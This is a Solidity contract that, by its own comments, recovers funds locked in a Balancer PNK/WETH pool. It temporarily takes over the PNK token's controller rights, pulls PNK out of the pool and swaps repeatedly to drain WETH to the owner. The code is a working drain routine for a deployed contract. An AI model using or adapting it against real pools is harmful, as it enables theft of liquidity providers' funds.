pragma solidity 0.5.12;

interface MiniMeToken {
    function approve(address _spender, uint256 _amount) external returns (bool success);

    function balanceOf(address _owner) external view returns (uint256 balance);

    function transferFrom(
        address _from,
        address _to,
        uint256 _amount
    ) external returns (bool success);

    function transfer(address _to, uint256 _amount) external returns (bool success);

    function changeController(address _governor) external;
}

interface WETH9 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address dst, uint256 wad) external returns (bool);
}

interface KlerosLiquid {}

interface BPool {
    function totalSupply() external view returns (uint256);
    function balanceOf(address whom) external view returns (uint256);
    function getBalance(address token) external view returns (uint256);
    function getSwapFee() external view returns (uint256);
    function gulp(address token) external;
    function swapExactAmountIn(
        address tokenIn,
        uint256 tokenAmountIn,
        address tokenOut,
        uint256 minAmountOut,
        uint256 maxPrice
    ) external returns (uint256 tokenAmountOut, uint256 spotPriceAfter);
}

/*
    Recover funds related to the BPT liquidity locked at 0xd14b5739f5ff646e8f9b6ccf661257cbdf6dd0c4ece8b371eabe397b9d05da6e

    WARNING: The liquidity in this pool will lose about 96% (pool's BPT balance / BPT total supply) of its value at the time of writing

    Only the controller of PNK (MiniMeToken) can transfer tokens at will.
        WETH is at 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
        PNK  is at 0x93ED3FBe21207Ec2E8f2d3c3de6e058Cb73Bc04d
        Its controller is KlerosLiquid at 0x988b3a538b618c7a603e1c11ab82cd16dbe28069
        The controller's governor is 0x334f12afb7d8740868be04719639616533075234 (EOA)

    Everything must happen in the same transaction to prevent front-running

    KlerosLiquid can only execute one arbitrary internal transaction (as the msg.sender)
        at a time (call rather than delegatecall)
    This implies that either:
     - KlerosLiquid's governor needs to be changed (temporarily) to the attacking contract, or
     - PNK's controller needs to be changed (temporarily) to the attacking contract
    Here we went for the second (simplest) solution

    Attack steps:
        1. Deploy BalancerPoolRecoverer
        2. Transfer PNK's controller rights to the deployed BalancerPoolRecoverer
        3. Execute BalancerPoolRecoverer.attack()
*/

contract BalancerPoolRecoverer {
    uint256 constant gasPerIteration = 1;
    uint256 constant BONE = 10 ** 18;

    address owner;

    MiniMeToken pnkToken;
    WETH9 wethToken;
    BPool bpool;
    KlerosLiquid controller;

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    constructor(
        MiniMeToken _pnkToken,
        WETH9 _wethToken,
        BPool _bpool,
        KlerosLiquid _controller
    ) public {
        owner = msg.sender;
        pnkToken = _pnkToken;
        wethToken = _wethToken;
        bpool = _bpool;
        controller = _controller;
    }

    function restoreController() public onlyOwner {
        pnkToken.changeController(address(controller));
    }

    // Since the attack contract is PNK's controller, it has to allow transfers and approvals
    function onTransfer(address _from, address _to, uint256 _amount) public returns (bool) {
        return true;
    }
    function onApprove(address _owner, address _spender, uint _amount) public returns (bool) {
        return true;
    }

    function attack() external onlyOwner {
        /* QUERY POOL STATE */
        uint256 totalSupply = bpool.totalSupply();
        uint256 balanceBPT  = bpool.getBalance(address(bpool));
        uint256 balancePNK  = bpool.getBalance(address(pnkToken));
        uint256 balanceWETH = bpool.getBalance(address(wethToken));
        uint256 swapFee     = bpool.getSwapFee();
        uint256 recoverWETH = balanceWETH * balanceBPT / totalSupply;
        uint256 recoverPNK  = balancePNK * balanceBPT / totalSupply;

        /* COMPUTATIONS */
        uint256 num   = (balancePNK - recoverPNK) * recoverWETH;
        uint256 denum = balanceWETH - swapFee * (balanceWETH - recoverWETH) / BONE;
        uint256 tokenAmountIn = num / denum;

        /* PULL PNK */
        pnkToken.transferFrom(address(bpool), address(this), recoverPNK + tokenAmountIn); // Need to be the controller
        balancePNK -= recoverPNK + tokenAmountIn;
        bpool.gulp(address(pnkToken));
        pnkToken.approve(address(bpool), tokenAmountIn);

        /* PULL WETH (A.K.A ARBITRATION) */
        uint256 nextAmountIn  = balancePNK / 2;
        uint256 nextAmountOut = calcOutGivenIn(
            balancePNK,   // tokenBalanceIn
            balanceWETH,  // tokenBalanceOut
            nextAmountIn, // tokenAmountIn
            swapFee       // swapFee
        );
        uint256 recovered = nextAmountOut; // Amount of WETH recovered *after* the iteration

        // Repeat as long as
        //  - there is still WETH to recover, or
        //  - recovering the next WETH would cost too much gas
        while (recovered < recoverWETH && nextAmountOut > gasPerIteration * tx.gasprice) {
            bpool.swapExactAmountIn(
                address(pnkToken),  // tokenIn
                nextAmountIn,       // tokenAmountIn
                address(wethToken), // tokenOut
                0,                  // minAmountOut
                uint256(-1)         // maxPrice
            );

            balancePNK  += nextAmountIn;
            balanceWETH -= nextAmountOut;

            nextAmountIn  = balancePNK / 2;
            nextAmountOut = calcOutGivenIn(
                balancePNK,   // tokenBalanceIn
                balanceWETH,  // tokenBalanceOut
                nextAmountIn, // tokenAmountIn
                swapFee       // swapFee
            );

            recovered += nextAmountOut;
        }

        // There is voluntarily no test case if the next swap would recover too much WETH
        // since we are we are by far the largest LP so this amount is negligible

        /* SEND RECOVERED TOKENS */
        pnkToken.transfer(owner, pnkToken.balanceOf(address(this)));
        wethToken.transfer(owner, wethToken.balanceOf(address(this)));

        /* RESTORE CONTROLLER */
        restoreController();
    }

    // Code taken and adapted from https://github.com/balancer-labs/balancer-core
    function calcOutGivenIn(
        uint256 tokenBalanceIn,
        uint256 tokenBalanceOut,
        uint256 tokenAmountIn,
        uint256 swapFee
    )
        internal pure returns (uint256)
    {
        uint256 adjustedIn = bmul(tokenAmountIn, BONE - swapFee);
        uint256 y = bdiv(tokenBalanceIn, tokenBalanceIn + adjustedIn);
        uint256 bar = BONE - y;
        return bmul(tokenBalanceOut, bar);
    }

    function bmul(uint256 a, uint256 b)
        internal pure returns (uint256)
    {
        uint256 c0 = a * b;
        uint256 c1 = c0 + (BONE / 2);
        return c1 / BONE;
    }

    function bdiv(uint256 a, uint256 b)
        internal pure returns (uint256)
    {
        uint256 c0 = a * BONE;
        uint256 c1 = c0 + (b / 2);
        return c1 / b;
    }
}
